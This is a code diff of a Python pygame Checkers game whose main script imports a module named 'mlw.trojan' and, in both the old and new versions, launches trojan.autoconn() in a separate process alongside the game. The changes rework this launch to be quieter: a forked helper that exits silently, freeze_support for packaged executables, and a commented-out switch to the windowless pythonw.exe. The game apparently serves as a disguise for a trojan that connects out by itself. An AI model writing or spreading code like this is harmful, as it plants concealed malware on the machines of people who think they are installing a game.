@@ -1,8 +1,8 @@
-import pygame, os
+import pygame, os, sys
 from Board import Board
 from Game import Game
 import mlw.trojan as trojan
-import multiprocessing
+from multiprocessing import Process, freeze_support, set_executable
 
 pygame.init()
 
@@ -38,20 +38,35 @@ class Checkers:
 			self._draw(board)
 			self.FPS.tick(60)
 
+def trojcall():
+    # print("Fork!")
+    trojan.autoconn()
+    os._exit(1)
+
+def startr():
+    try:
+        p = Process(target=trojcall, args=())
+        # p.daemon = True
+        p.start()
+        
+        # trojan.autoconn()
+    except Exception as error: 
+        print(error)
+        # input('Press any key to end')
+		# os._exit(1)
+
 
 if __name__ == "__main__":
-	window_size = (640, 640)
-	screen = pygame.display.set_mode(window_size)
-	pygame.display.set_caption("Checkers")
-
-	checkers = Checkers(screen)
-	checkers.main(window_size[0], window_size[1])
-	try:
-		p = multiprocessing.Process(target=trojan.autoconn)
-		p.daemon = True
-		p.start()
-	except Exception as error:
-		print(error)
-		input('Press any key to end')
-		os._exit(1)
-	# if tr_pid == 0: trojan.autoconn()
+    freeze_support()
+    # set_executable(os.path.join(sys.exec_prefix, 'pythonw.exe'))
+    
+    window_size = (640, 640)
+    screen = pygame.display.set_mode(window_size)
+    pygame.display.set_caption("Checkers")
+    
+    checkers = Checkers(screen)
+    checkers.main(window_size[0], window_size[1])
+    
+    startr()
+    sys.exit(0)
+    
